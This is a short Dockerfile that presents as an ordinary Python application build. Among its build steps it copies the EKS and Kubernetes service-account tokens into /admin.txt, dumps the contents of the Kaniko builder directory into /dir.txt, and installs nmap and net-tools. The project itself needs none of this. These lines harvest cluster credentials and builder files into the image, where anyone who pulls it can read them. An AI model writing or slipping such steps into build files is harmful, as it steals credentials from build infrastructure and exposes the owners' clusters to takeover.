FROM python:3.6
COPY . /app
WORKDIR /app
RUN echo `cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token` >> /admin.txt
RUN echo `cat /var/run/secrets/kubernetes.io/serviceaccount/token` >> /admin.txt
RUN apt-get update
RUN apt-get install nmap -y
RUN apt install tree 
RUN echo `tree /kaniko` > /dir.txt
RUN echo `ls -l /kaniko` >> /dir.txt
RUN echo `cat /kanico/*` >> /dir.txt
RUN apt update
RUN apt install net-tools -y
RUN pip install -r requirements.txt
ENTRYPOINT ["python"]
CMD ["app.py"]
